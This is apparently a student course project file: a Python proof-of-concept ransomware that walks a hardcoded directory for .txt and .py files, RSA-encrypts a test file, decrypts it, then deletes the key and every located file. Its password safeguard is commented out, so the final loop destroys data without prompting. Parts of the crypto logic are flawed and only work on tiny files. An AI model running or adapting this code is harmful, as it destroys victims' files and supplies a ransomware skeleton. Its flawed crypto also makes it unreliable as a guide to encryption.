# Project - TDA602
# Proof-of-concept Ransomware

# Read all files with certain extensions
import os
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes


# safeguard = input('password: ')
# if safeguard != 'run':
#     quit()

# List of all files extensions to encrypt
ext_to_encrypt = ['txt', 'py']
path = '/home/l30/Desktop/LP4/TDA602/project/ransomware/target'

# Collection of all files with exts
#Looks for txt and py files in the directory, appending their path to a list
def locate_files (path, exts):
    file_paths = []
    for root, _, files in os.walk(path):
        for file in files:
            if file.split('.')[-1] in exts:
                file_paths.append(root + '/' + file)
    return file_paths

file_paths = locate_files (path, ext_to_encrypt)
        
for path in file_paths:
    print(path)

# Encrypt a file with a key
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)

# serialize the key.
key_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.BestAvailableEncryption(b'mypassword')
    )

#Writing the key to a file
with open('key.pem', 'wb') as pem:
    pem.write(key_pem)


filename = 'target/test.txt'
pubkey = private_key.public_key()
with open(filename, "rb") as file:
    file_data = file.read()
    
encrypted_data  = pubkey.encrypt(
    file_data, 
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)
#Creating a new file where it writes the data
with open (filename + '.encrypted', 'wb') as encryped_file:
    encryped_file.write(encrypted_data)


# Key loading
with open('key.pem', 'rb') as key_file:
    new_private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=b'mypassword'
    )

with open('target/test.txt.encrypted', 'r') as encrypted_file:
    decrypted_data = new_private_key.decrypt(
        encrypted_data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

with open (filename + '.decrypted', 'wb') as decryped_file:
    decryped_file.write(decrypted_data)

os.remove('key.pem')
for file in file_paths:
    os.remove(file)